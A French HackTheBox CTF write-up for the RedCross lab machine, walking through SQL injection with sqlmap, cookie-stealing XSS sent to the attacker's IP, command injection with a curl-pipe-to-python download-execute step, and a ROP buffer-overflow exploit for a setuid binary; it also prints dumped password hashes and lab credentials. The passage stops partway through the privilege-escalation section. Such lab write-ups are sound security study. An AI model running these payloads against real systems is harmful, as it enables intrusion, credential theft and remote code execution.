# Solution du CTF RedCross de HackTheBox

Intro
-----

*RedCross* est un CTF basé Linux créé par [@ompamo](https://twitter.com/ompamo) et proposé sur HackTheBox.  

Il est donné pour 30 points sachant que la notation va jusqu'à 50. C'est donc un bon CTF intermédiaire (... enfin tout dépend comment on le résoud).  

Identifiants par défaut
-----------------------

```plain
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.25
443/tcp open  ssl/http Apache httpd 2.4.25
```

On a ici un port 80 qui fait une redirection automatique vers le port 443 de *intra.redcross.htb*.  

Le port 443 livre quand à lui un certificat matchant ce nom d'hôte.  

![HackTheBox CTF RedCross homepage](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/redcross/redcross_www.png)

Le site dispose d'une page de login et d'un formulaire de contact. Les URLs peuvent penser à la présence d'une faille include ou directory traversal mais il n'en est rien.  

Un gobuster nous remonte les dossiers suivants à la racine :  

```plain
/images (Status: 301)
/pages (Status: 301)
/documentation (Status: 301)
/javascript (Status: 301)
/server-status (Status: 403)
```

Dans le dossier pages on retrouve ainsi les pages qui peuvent être chargées via le paramètre *page* (toujours via *gobuster*) :  

```plain
/contact.php (Status: 200)
/login.php (Status: 200)
/header.php (Status: 200)
/bottom.php (Status: 200)
/app.php (Status: 302)
/actions.php (Status: 302)
```

Ne trouvant rien de plus je me suis penché sur la recherche d'autres sous-domaines, la présence de *intra* n'étant probablement pas là pour rien.  

```plain
$ patator http_fuzz url="https://10.10.10.113/" method=GET header="Host: FILE0.redcross.htb" 0=/usr/share/sublist3r/subbrute/names.txt -x ignore:code=301
15:57:26 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2018-12-31 15:57 CET
15:57:26 patator    INFO -
15:57:26 patator    INFO - code size:clen       time | candidate                          |   num | mesg
15:57:26 patator    INFO - -----------------------------------------------------------------------------
15:57:28 patator    INFO - 302  707:363        0.032 | admin                              |    36 | HTTP/1.1 302 Found
15:57:30 patator    INFO - 302  807:463        0.030 | intra                              |   619 | HTTP/1.1 302 Found
```

Go-buster again. On y trouve des dossiers en commun avec le précédent host et d'autres indépendants :  

```plain

/images (Status: 301)
/pages (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
```

Il faut dire que ce site admin ressemble comme deux goûtes d'eau à l'autre si ce n'est le logo qui change. On trouve tout de même de nouveaux scripts dans */pages* :  

```plain
/login.php (Status: 200)
/header.php (Status: 200)
/users.php (Status: 302)
/bottom.php (Status: 200)
/firewall.php (Status: 302)
/actions.php (Status: 302)
/cpanel.php (Status: 302)
```

A force d'énumération on finit par découvrir la présence d'un document *account-signup.pdf* sous le dossier *documentation* de *intra*.  

Devoir chercher la présence de fichiers PDFs est quelque chose que l'on rencontre rarement sur un CTF mais vu le nom du dossier ça se tenait...  

![HackTheBox CTF RedCross pdf file account signup](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/redcross/redcross_pdf.png)

Ce document signé par une certaine *Penelope Harris* nous informe en quelque sorte qu'un traitement automatisé permet la création de comptes sur l'appli *intra*.  

Le format très particulier des données attendues laisse supposer qu'il y a matière à injecter quelque chose.  

Qu'importe pour le moment car, quand on soumet des données dans le format attendu, on obtient un message indiquant que notre demande est en cours et que l'on peut se rabattre en attendant sur le compte *guest* (password *guest*).  

Ta mère elle va dumper
----------------------

Une fois connecté on se retrouve sur ce qui s'apparente plus ou moins à une boîte de messagerie avec un message rappelant que notre compte est en attente de création.  

La page contient une zone de texte avec un label *UserID* et un bouton *filter*. Evidemment tout bon hacker qui se respecte s'empresse de rentrer apostrophe et guillemet pour voir comment le script répond et ça paye aussitôt :  

> DEBUG INFO: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '5' or dest like '"'') LIMIT 10' at line 1

On est tout de suite plus dans notre élément là :)  

Faisons chauffer sqlmap ! Bien sûr il faut passer le cookie de session que l'on aura extrait depuis notre navigateur (via les dev tools ou extension dédiée).  

Premier essai et aucun résultat :( Le message d'erreur est pourtant bien verbeux donc on voit pas trop comment il peut passer à côté.  

La première intuition est d'utiliser un user-agent aléatoire au lieu de celui clairement identifiable de l'outil :  

```plain
$ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" -p o --cookie="PHPSESSID=mreqtebbk20fa24ppak7rj3k81"  --random-agent --keep-alive --delay=2 --current-user

[*] starting at 15:25:51

[15:25:51] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1) Gecko/2008072610 Firefox/2.0.0.12' from file '/usr/share/sqlmap/txt/user-agents.txt'
[15:25:52] [INFO] resuming back-end DBMS 'mysql'
[15:25:52] [INFO] testing connection to the target URL
[15:25:54] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: o (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: o=1') AND (SELECT 6275 FROM(SELECT COUNT(*),CONCAT(0x7170787671,(SELECT (ELT(6275=6275,1))),0x7170787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NyaP&page=app

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: o=1') AND SLEEP(5)-- DUKy&page=app
---
[15:25:54] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0
[15:25:54] [INFO] fetching current user
[15:26:05] [INFO] retrieved: dbcross@localhost
current user:    'dbcross@localhost'
[15:26:05] [INFO] fetched data logged to text files under '/home/devloop/.sqlmap/output/intra.redcross.htb'

[*] shutting down at 15:26:05
```

Cette fois ça passe comme dans du beurre. L'auteur que sqlmap [a mentionné une variable d'environnement](https://twitter.com/sqlmap/status/1085887247998689280) pour ne pas ce soucier de ce problème.  

Je vous fait grâce des légères modifications de commandes pour lister les bases de données, tables et dumper tout ça : *sqlmap -h* (ou *-hh*) se suffit à lui même.  

```plain
available databases [2]:
[*] information_schema
[*] redcross

Database: redcross
[3 tables]
+----------+
| messages |
| requests |
| users    |
+----------+

Database: redcross
Table: requests
[0 entries]
+----+------+-------+---------+
| id | body | cback | subject |
+----+------+-------+---------+
+----+------+-------+---------+

Database: redcross
Table: messages
[8 entries]
+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+
| id | body                                                                                                                                                                                         | dest | origin | subject                                      |
+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+
| 1  | You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.              | 5    | 1      | Guest Account Info                           |
| 2  | Hi Penny, can you check if is there any problem with the order? I'm not receiving it in our EDI platform.                                                                                    | 2    | 4      | Problems with order 02122128                 |
| 3  | Please could you check the admin webpanel? idk what happens but when I'm checking the messages, alerts popping everywhere!! Maybe a virus?                                                   | 3    | 1      | Strange behavior                             |
| 4  | Hi, Please check now... Should be arrived in your systems. Please confirm me. Regards.                                                                                                       | 4    | 2      | Problems with order 02122128                 |
| 5  | Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it... Alerts everywhere!!                                           | 2    | 3      | admin subd webapp problems                   |
| 6  | Hi, Yes it's strange because we applied some input filtering on the contact form. Let me check it. I'll take care of that since now! KR                                                      | 3    | 2      | admin subd webapp problems (priority)        |
| 7  | Hi, Please stop checking messages from intra platform, it's possible that there is a vuln on your admin side...                                                                              | 1    | 2      | STOP checking messages from intra (priority) |
| 8  | Sorry but I can't do that. It's the only way we have to communicate with partners and we are overloaded. Doesn't look so bad... besides that what colud happen? Don't worry but fix it ASAP. | 2    | 1      | STOP checking messages from intra (priority) |
+----+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------+--------+----------------------------------------------+

Database: redcross
Table: users
[5 entries]
+----+------+------------------------------+----------+--------------------------------------------------------------+
| id | role | mail                         | username | password                                                     |
+----+------+------------------------------+----------+--------------------------------------------------------------+
| 1  | 0    | admin@redcross.htb           | admin    | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. |
| 2  | 1    | penelope@redcross.htb        | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS |
| 3  | 1    | charles@redcross.htb         | charles  | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i |
| 4  | 100  | tricia.wanderloo@contoso.com | tricia   | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. |
| 5  | 1000 | non@available                | guest    | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi |
+----+------+------------------------------+----------+--------------------------------------------------------------+
```

Next-step, casser les hashs bien sûr. JTR a fait ça très bien. L'algo de hash utilisé ici est toutefois assez fort ce qui est un peu regrettable sur un CTF (ça privilégie les participants ayant un GPU et ça n'apporte rien sur le plan technique).  

```plain
guest:guest
charles:cookiemonster
penelope:alexss
```

Ces identifiants ne nous ouvrent pas la porte de la section *admin* mais les messages demandant aux utilisateurs de ne pas consulter les messages laissent supposer qu'il y a une faille XSS quelque part.  

Call Me
-------

Retour sur le formulaire de contact. Si on rentre du HTML dans la partie *Request* ou *Details* on obtient un message indiquant que l'attaque est détectée et qu'on a été bloqué par le *input filtering* mentionné plus haut.  

Le dernier champ du formulaire permettant de laisser un email ou un numéro de téléphone ne semble en revanche pas vérifié.  

Du coup on peut tester en essayant de provoquer le chargement d'une image vers un serveur web sous notre contrôle. On n'oublie pas de lancer un wireshark pour avoir la totalité de la requête avec le user-agent :  

![HackTheBox CTF RedCross PhantomJS user-agent](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/redcross/redcross_phantomjs.png)

On voit ici qu'une action humaine est émulée via l'emploi du navigateur headless PhantomJS.  

L'objectif est maintenant d'obtenir le cookie de l'administrateur. Pour cela on va forger une URL contenant le cookie et l'injecter dans le DOM sous forme d'une image :  

```html
<script>var img = document.createElement("img"); img.src = "http://10.10.12.5/?" + encodeURI(document.cookie); document.body.appendChild(img);</script>
```

Groovy :)

```plain
10.10.10.113 - "GET /PHPSESSID=cg9l76l7f755ki5v0iufj1vob5;%20LANG=EN_US;%20SINCE=1546424177;%20LIMIT=10;%20DOMAIN=admin HTTP/1.1" 404 -
```

Une fois le cookie injecté dans notre navigateur (par exemple avec *Cookie Manager* sous Firefox) on peut accéder au *control panel* qui propose une gestion utilisateurs :  

![HackTheBox RedCross CTF user management interface](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/redcross/redcross_user.png)

ainsi qu'un script de whitelisting d'IPs... donc certainement une utilisation de iptables... dont probablement une faille d'injection de commande ? A voir.  

![HackTheBox RedCross CTF IP management interface](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/redcross/redcross_firewall.png)

Sésame, ouvre-toi
-----------------

J'ai commencé par soumettre mon IP sur ce second script puis j'ai relancé un scan Nmap qui a détecté de nouveaux ports :  

```plain
21/tcp   open  ftp         vsftpd 2.0.8 or later
|_banner: 220 Welcome to RedCross FTP service.
1025/tcp open  NFS-or-IIS?
5432/tcp open  postgresql  PostgreSQL DB 9.6.0 or later
| fingerprint-strings:
|   SMBProgNeg:
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 1.0 to 3.0
|     Fpostmaster.c
|     L2030
|_    RProcessStartupPacket
| ssl-cert: Subject: commonName=redcross.redcross.htb
| Subject Alternative Name: DNS:redcross.redcross.htb
| Not valid before: 2018-06-03T19:13:20
|_Not valid after:  2028-05-31T19:13:20
| ssl-dh-params:
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
```

La page *users* permet uniquement de spécifier un nom d'utilisateur. Une fois soumis on obtient un mot de passe généré aléatoirement.  

Ces identifiants permettent d'accéder au serveur FTP. On y trouve deux dossiers à la racine qui appartiennent à root (uid 0) et un groupe inconnu (uid 1001) :  

```plain
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        1001         4096 Jun 09  2018 .
drwxr-xr-x    4 0        1001         4096 Jun 09  2018 ..
drwxr-xr-x    2 0        1001         4096 Jun 08  2018 interface_data
drwxrwxr-x    3 0        1001         4096 Jun 08  2018 public
```

Dans */public/src* on trouve le code source suivant :  

```plain
-rw-r--r--    1 1000     1000         2666 Jun 10  2018 iptctl.c
```

L'autre dossier est lui vide. On verra plus tard pour le code source qui n'apporte rien à ce moment du CTF.  

On peut utiliser les même creds générés pour accéder au SSH. Notre compte est rattaché au groupe *associates* avec le gid vu plus tôt :  

```plain
uid=2023 gid=1001(associates) groups=1001(associates)
```

L’environnement est typique d'un chroot. Pas de */proc*, nombre de librairies et exécutables minimaliste (libc, nss, pcre mais aussi les libs pour iptables et postgres).  

Idem dans */dev* il n'y a que *null* qui est présent. On ne dispose de toute façon d'aucune action possible car la recherche de fichiers ou dossiers écrivables ne retourne rien.  

On relèvera seulement la présence d'un utilisateur *penelope* d'uid 1000 dans */etc/passwd*.  

Il donc temps de tenter d'injecter des commandes dans cette interface de whitelist d'adresse IP.  

Que ce soit pour la gestion des utilisateurs ou des IPs, les données de formulaire sont soumises à la page *action.php*  

Le script reçoit ainsi un paramètre *ip* pour l'adresse, une *action* qui sera soit *Allow IP* soit *deny* et un paramètre *id* supplémentaire quand l'action est *deny*.  

Via [ZAP](https://www.owasp.org/index.php/ZAP) j'ai modifié la requête de whitelist pour tenter d'injecter des commandes sans jamais parvenir à mes fins : un message indique à chaque fois que le format d'adresse IP est invalide.  

En mode *deny* en revanche aucune vérification ne semble être faite. On insère alors un point virgule pour clôturer la commande précédente et on met un point virgule en fin pour que nos commandes n'aient pas d'arguments invalides.  

J'ai remarqué que d'après l'output obtenu la dernière commande insérée semble exécutée deux fois :-/ Par conséquent j'ai préféré mettre la commande inoffensive *date* en bout de chaîne.  

La requête à envoyer sera de cette forme :  

```plain
POST https://admin.redcross.htb/pages/actions.php HTTP/1.1
ip=8.8.8.8;id;uname -a;pwd;date;&id=17&action=deny
```

![HackTheBox CTF RCE in IP management](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/redcross/redcross_zap_rce.png)

Puisque la machine est susceptible d'être réinitialisée j'ai écrit un script pour automatisuer toute cette première partie : envoyer le XSS via le formulaire de contact et injecter ensuite une commande download-execute dans l'interface admin :  

```python
from subprocess import check_output
from time import sleep
import re

import requests

output = check_output(["ifconfig", "tun0"], encoding="utf-8")
ip = re.search("inet (\d+\.\d+\.\d+\.\d+)", output).group(1)
print("Your IP is {}.".format(ip))

sess = requests.session()
response = sess.post(
    "https://intra.redcross.htb/pages/actions.php",
    data={
        "action": "contact",
        "body": "username=yolo",
        "cback": """<script>var img=document.createElement("img");img.src="http://{}/?"+encodeURI(document.cookie);document.body.appendChild(img);</script>""".format(ip),
        "subject": "credentials please"
    },
    verify=False
)
print(response.text)

sess_id = input("please enter session ID:").strip()
response = requests.post(
    "https://admin.redcross.htb/pages/actions.php",
    data={
        "ip": "8.8.8.8;curl http://{}/tcp_pty_backconnect.py|python;date;".format(ip),
        "id": "17",
        "action": "deny"
    },
    headers={"Cookie": "PHPSESSID={};".format(sess_id)},
    verify=False
)
print(response.text)
```

Ce code nécessite de disposer d'un serveur web qui livrera [une backdoor python](https://github.com/infodox/python-pty-shells) et capturera le cookie (*python3 -m http.server* fait l'affaire).  

Kansas City Shuffle
-------------------

Le CTF semble offrir plusieurs scénarios pour arriver à la fin. Ce qui suit permet de passer directement de l'utilisateur *www-data* (obtenu par la précédente injection) à root sans passer par l'utilisatrice *penelope* qui possède le flag de mi-chemin (*user.txt*).  

Quand on ouvre le script *action.php* on retrouve la faille d'injection de commande :  

```php
if($action==='deny'){
        header('refresh:1;url=/?page=firewall');
        $id=$_POST['id'];
        $ip=$_POST['ip'];
        $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
        $result = pg_prepare($dbconn, "q1", "DELETE FROM ipgrants WHERE id = $1");
        $result = pg_execute($dbconn, "q1", array($id));
        echo system("/opt/iptctl/iptctl restrict ".$ip);
}
```

Le code n'appelle pas directement *iptables* mais utilise le binaire custom *iptctl* qui est setuid/setgid root.  

Puisqu'on a obtenu son code source plus tôt il est temps de s'y plonger :)  

```c
/*
 * Small utility to manage iptables, easily executable from admin.redcross.htb
 * v0.1 - allow and restrict mode
 * v0.3 - added check method and interactive mode (still testing!)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#define BUFFSIZE 360

int isValidIpAddress(char *ipAddress)
{
	struct sockaddr_in sa;
	int result = inet_pton(AF_INET, ipAddress, &(sa.sin_addr));
	return result != 0;
}

int isValidAction(char *action) {
	int a=0;
	char value[10];

	strncpy(value,action,9);
	if(strstr(value,"allow")) a=1;
	if(strstr(value,"restrict")) a=2;
	if(strstr(value,"show")) a=3;
	return a;
}

void cmdAR(char **a, char *action, char *ip) {
	a[0]="/sbin/iptables";
	a[1]=action;
	a[2]="INPUT";
	a[3]="-p";
	a[4]="all";
	a[5]="-s";
	a[6]=ip;
	a[7]="-j";
	a[8]="ACCEPT";
	a[9]=NULL;
	return;
}

void cmdShow(char **a) {
	a[0]="/sbin/iptables" ;
	a[1]="-L";
	a[2]="INPUT";
	return;
}

void interactive(char *ip, char *action, char *name) {
	char inputAddress[16];
	char inputAction[10];

	printf("Entering interactive mode\n");
	printf("Action(allow|restrict|show): ");
	fgets(inputAction,BUFFSIZE,stdin);
	fflush(stdin);
	printf("IP address: ");
	fgets(inputAddress,BUFFSIZE,stdin);
	fflush(stdin);
	inputAddress[strlen(inputAddress)-1] = 0;

	if (! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)) {
		printf("Usage: %s allow|restrict|show IP\n", name);
		exit(0);
	}
	strcpy(ip, inputAddress);
	strcpy(action, inputAction);
	return;
}

int main(int argc, char *argv[]){
	int isAction=0;
	int isIPAddr=0;
	pid_t child_pid;
	char inputAction[10];
	char inputAddress[16];
	char *args[10];
	char buffer[200];

	if (argc!=3 && argc!=2) {
		printf("Usage: %s allow|restrict|show IP_ADDR\n", argv[0]);
		exit(0);
	}

	if (argc==2) {
		if (strstr(argv[1],"-i")) interactive(inputAddress, inputAction, argv[0]);
	} else {
		strcpy(inputAction, argv[1]);
		strcpy(inputAddress, argv[2]);
	}

	isAction=isValidAction(inputAction);
	isIPAddr=isValidIpAddress(inputAddress);

	if (!isAction || !isIPAddr) {
		printf("Usage: %s allow|restrict|show IP\n", argv[0]);
		exit(0);
	}

	puts("DEBUG: All checks passed... Executing iptables");
	if (isAction==1) cmdAR(args,"-A",inputAddress);
	if (isAction==2) cmdAR(args,"-D",inputAddress);
	if (isAction==3) cmdShow(args);

	child_pid=fork();

	if (child_pid==0) {
		setuid(0);
		execvp(args[0],args);
		exit(0);
	} else {
		if (isAction==1) printf("Network access granted to %s\n",inputAddress);
		if (isAction==2) printf("Network access restricted to %s\n",inputAddress);
		if (isAction==3) puts("ERR: Function not available!\n");
	}
}
```

Le programme peut fonctionner selon deux modes, soit en recevant l'IP et l'action en ligne de commande soit interactivement si on passe l'option *-i*.  

Dans tous les cas les paramètres sont vérifiés avec *isValidAction* et *isValidIpAddress*.  

Cette vérification est même redondante en mode interactif puisque *interactive()* appelle ces fonctions qui sont rappelées à sa sortie.  

Ensuite, selon l'action passée, un tableau de chaînes de caractères est préparé pour être passé à *execvp*. Donc pas d'injection de commandes comme on aurait pu le faire avec un appel à *system()*.  

J'ai testé un peu la fonction *isValidIpAddress* et de toute évidence on ne peut rien faire pour la tromper, ce qui n'est pas le cas de *isValidAction* qui applique seulement un *strstr*.  

Maintenant côtés vulnérabilités on a d'un côté les *strcpy()* présents dans le *main()* mais ce sont des *strcpy()* donc ils vont s'arrêter au premier octet nul et là le binaire est en 64 bits donc autant dire que les adresses mémoire en contiennent en certain nombre... Le tout sur un système où l'ASLR est activé... Ce sera sans moi.  

Le mode interactif me semble plus attrayant : il lit via *fgets()* jusqu'à 360 octets dans un buffer capable de n'en contenir que 10. Cette fonction ne s'arrête pas aux octets nuls comme le spécifie la page de manuel :  

> fgets() reads in at most one less than size characters from stream and stores them into the buffer pointed to by s. Reading stops after an EOF or a newline. If a newline is read, it is stored into the buffer. A terminating null byte ('\0') is stored after the last character in the buffer.

Brainstorming
-------------

Mais comment l'exploiter ? Certains sur le forum de *HackTheBox* ont mentionné un *ret2libc*... Pas sûr qu'ils l'aient tenté d'ailleurs :p  

Pour exploiter un cas de ce type il faut être en mesure de leaker l'adresse d'une fonction pour calculer l'adresse de *system()* (par exemple) afin de l'appeler ensuite.  

A ce sujet il y a [cet excellent article](https://nandynarwhals.org/ret2libc-namedpipes/) de [@nn\_amon](https://twitter.com/nn_amon) qui est un peu dans un cas d'exploitation similaire.  

Dans le code C de *iptctl* on voit des appels à *printf* avec juste un argument ce qui signifie (les habitués de reverse l'auront deviné) que le compilateur a converti cet appel en un *puts()*.  

On pourrait donc se servir de *puts()* pour leaker l'adresse de *fgets()* puis en déterminer (par simple addition/soustraction) l'adresse de *system()*.  

Il faut toutefois être alors en mesure de faire en sorte que le programme lit cette nouvelle adresse pour sauter dessus. Pour cela *fgets()* est disponible mais il faut bien voir que tout ça ne peut pas se faire en une seule passe dans la fonction *interactive()* puisque le principe d'un buffer overflow et qu'on saute sur notre shellcode au moment où l'on quitte la fonction (adresse de retour écrasée) :p  

On peut certes imaginer avoir un shellcode qui effectue un *puts(fgets)* puis force une re-exécution de la fonction *interactive()* qu'on exploitera une seconde fois pour cette fois appeler *system()*.  

L'exploitation me semble très compliquée car un tel scénario met la pile du programme dans un beau bazar. En 32bits cela aurait été vraiment problématique car *interactive()* serait allé chercher ses arguments pour *strcpy()* sur la stack :D Ici on est plus libre de mouvement mais ça fait trop de contraintes à mon goût :p  

King Of Pop Ret
---------------

On oublie donc *system()* et puisqu'on a *execvp()* sous la main on va s'en contenter... Un autre problème c'est qu'avec *ret2lib* on aurait dû calculer l'adresse de */bin/sh* et là... c'est le flou :)  

Maintenant pour l'écriture de notre exploit il nous faut [ROP](https://fr.wikipedia.org/wiki/Return-oriented_programming)er en raison de l'ASLR et de la stack non-exécutable. Pour cela il faut trouver des gadgets (suites d'instructions réutilisables) qui vont nous servir à détourner le flot d'exécution du programme et appeler une commande externe.  

En 32bits cela aurait été assez simple car les fonctions et syscalls prennent leurs arguments sur la stack mais en 64bits ils prennent depuis les registres dans cet ordre : rdi, rsi, rdx, rcx, r8, r9.  

Il faut donc des gadgets qui mettent les valeurs que l'on souhaite dans ces registres via une instruction pop.  

Avec [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) j'en ait relevé deux utiles :  

```plain
0x0000000000400de3 : pop rdi ; ret
0x0000000000400de1 : pop rsi ; pop r15 ; ret
```

Maintenant deux points important sur l'état de la mémoire du programme au moment de l'exploitation :  

* Les registres rax et rdi pointent sur la chaîne de caractère *action* que l'on a saisit. Elle sera forcément tronquée car l'adresse IP la suit directement en mémoire et un octet nul est forcé (ligne 64 du code)
* Il faut 34 octets à partir de *action* avant d'écraser l'adresse de retour

Et une problématique :  

* Pour appeler *setuid(0)* il faut que rdi soit mis à 0 écrasant donc sa valeur
* Lorsque l'on appelle *setuid*, la valeur de retour sera mise dans rax écrasant alors sa valeur

Il faudrait alors un gadget pour *"sauvegarder"* la valeur de rax/eax ou rdi/edi... évidemment il n'y a rien :p  

Bon on n'est pas obligé d'appeler *setuid* : avec [un effective UID](https://intelligea.wordpress.com/2014/02/11/effective-user-id-and-group-id-vs-real-user-id-and-group-id/) (euid) à 0 ce sera suffisant pour afficher le contenu du flag.  

Voici mon exploit final :  

```python
#!/usr/bin/env python3
# - devloop exploit for iptctl -
# HackTheBox RedCross CTF
# 
#                       :::!~!!!!!:.
#                   .xUHWH!! !!?M88WHX:.
#                 .X*#M@$!!  !X!M$$$$$$WWx:.
#                :!!!!!!?H! :!$!$$$$$$$$$$8X:
#               !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
#              :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
#              ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
#                !:~~~ .:!M"T#$$$$WX??#MRRMMM!
#                ~?WuxiW*`   `"#$$$$8!!!!??!!!
#              :X- M$$$$       `"T#$T~!8$WUXU~
#             :%`  ~#$$$m:        ~!~ ?$$$$$$
#           :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
# .....   -~~:<` !    ~?T#$$@@W@*?$$      /`
# W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
# #"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
# :::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
# .~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
# Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
# $R@i.~~ !     :   ~$$$$$B$$en:``
# ?MXT@Wx.~    :     ~"##*$$$$M~
#

import struct
import os
from subprocess import Popen, PIPE
from time import sleep
import sys

def qw(value):
    return struct.pack("<Q", value)

ppret = 0x400de1  # pop rsi ; pop r15 ; ret
execv = 0x400d13  # call execvp
exit0 = 0x400d18  # mov edi, 0 ; call exit

buff = b"/tmp/show\0"
buff += b"\0" * (34 - len(buff))
buff += qw(ppret)  # Met RSI à NULL (second paramètre de execvp)
buff += qw(0)
buff += qw(0)
buff += qw(execv)  # appelle execvp et exécute /tmp/show (RDI pointe déjà dessus)
buff += qw(exit0)  # On peut quitter proprepent après exécution :)
buff += b"\n"

with open(sys.argv[1], "wb", buffering=0) as fd:
    fd.write(buff)
    fd.write(b"1.1.1.1\n\n\n")
```

J'ai mis comme action */tmp/show* ce qui permet de passer la vérification de *isValidAction()* et est aussi un chemin que l'on peut contrôler.  

*execvp()* est plus difficile à utiliser qu'on peut le penser car on ne peut pas lui donner n'importe quoi en second argument mais il fonctionne s'il a 0 qu'il doit considérer comme NULL.  

Pour utiliser l'exploit il faut deux shells, l'un qui créé la fifo et exécute *iptctl* qui va lire dessus :  

```bash
mkfifo /tmp/myfifo; cat /tmp/myfifo| ./iptctl -i
```

Et le second lance juste l'exploit :  

```bash
python3 iptctl_exploit.py /tmp/myfifo
```

A l'emplacement */tmp/show* on mettra par exemple un reverse *Metepreter*. Avec un inline (linux/x64/meterpreter\_reverse\_tcp) ça fonctionnait mais *iptctl* crashait avec un stager.  

On a alors les droits pour lire le flag (*892a1f4d0*...) ou */etc/shadow* :  

```plain
root:$6$sGf6YPC9$H0ocTuQ4NWwgjlI0tMLXOb3jYR4QSOArGpeh/C7FL9HFpMSGGk4cDbKlyCwyrOVaCShgUOz3KVQP63OGs9Ij1.:17692:0:99999:7:::
penelope:$6$t15lzJqW$jAvVr1665q0qlnO.cbXOZp8hbgQRwNIv31gxvGASVMOYOrw4/LR6b/YQnk3DWxE4zl3BKCAqIm8CkWo/uuRi1.:17692:0:99999:7:::
```

You've got a mail
-----------------

Maintenant quelle était la méthode pour obtenir le flag de *Penelope* sans obtenir directement le root ?  

Quand on a notre premier shell on peut chercher dans les scripts PHP les identifiants PostgreSQL :  

```plain
$ grep -r --include "*.php" pg_connect * 2>/dev/null                    
admin/pages/firewall.php:   $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
admin/pages/users.php:  $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");
admin/pages/actions.php:    $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
admin/pages/actions.php:    $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
admin/pages/actions.php:    $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
admin/pages/actions.php:    $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
```

La base *redcross* liée à l'utilisateur *www* contient juste une table *ipgrants* correspondant aux enregistrements pour le whitelist d'adresses IP.  

L'autre base nommée *unix* et bien plus intéressante. En particulier elle contient une table *passwd\_table* qui contient les identifiants soumis via l'interface web or on a vu que ceux-ci permettent alors de se connecter via FTP ou SSH.  

Si on regarde les logs du système on voit clairement que le PAM est configuré pour utiliser la table Postgres en question (NB: pas vu de mots de passe stockés dans les logs).  

On dispose de suffisamment de droits pour lister le dossier personnel de l'utilisatrice *penelope* :  

```plain
total 36
drwxr-xr-x 4 penelope penelope 4096 Jun 10  2018 .
drwxr-xr-x 3 root     root     4096 Jun  8  2018 ..
-rw------- 1 root     root        0 Jun  8  2018 .bash_history
-rw-r--r-- 1 penelope penelope    0 Jun  8  2018 .bash_logout
-rw-r--r-- 1 penelope penelope 3380 Jun 10  2018 .bashrc
